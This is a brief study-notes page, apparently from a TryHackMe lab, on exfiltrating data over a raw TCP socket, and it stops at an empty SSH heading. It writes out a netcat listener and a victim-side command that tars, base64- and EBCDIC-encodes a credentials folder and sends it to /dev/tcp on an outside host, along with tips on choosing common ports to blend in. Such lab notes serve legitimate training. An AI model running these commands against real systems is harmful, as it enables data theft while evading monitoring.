# Data Exfiltration

### Exfil using a TCP socket

* Good for when you know there are no network based security products&#x20;
* This is NOT recommending in a network that is well secured
* This is easy to detect because we are using anon standard protocols&#x20;

<figure><img src=".gitbook/assets/9931b598f5757bbdfb74004a2a43fe16.png" alt=""><figcaption></figcaption></figure>

* This shows the two hosts communicating over port 1337&#x20;
* In the real world please pick a normal port like 443 or 80, 8080, 8443 etc, etc
* The first machine listens on 1337&#x20;
* The other machine connects to `1.2.3.4:1337`&#x20;
* The first machine establishes the connection&#x20;
* Finally you can now send and receive data&#x20;

#### Set up your listener on the attack machines&#x20;

```
nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
```

* Now on the victim to exfil the data

```
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
0+1 records in
0+1 records out
260 bytes copied, 9.8717e-05 s, 2.6 MB/s
```

* Note that we used the Base64 and EBCDIC encoding to protect the data during the exfiltration. If someone inspects the traffic, it would be in a non-human readable format and wouldn't reveal the transmitted file type.

```
ls -l /tmp/
-rw-r--r-- 1 root root       240 Apr  8 11:37 task4-creds.data
```

* On the attack box, we need to convert the received data back to its original status. We will be using the dd tool to convert it back.&#x20;

```
dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
tar xvf task4-creds.tar
task4/ 
task4/creds.txt
```

### Exfiltration using SSH
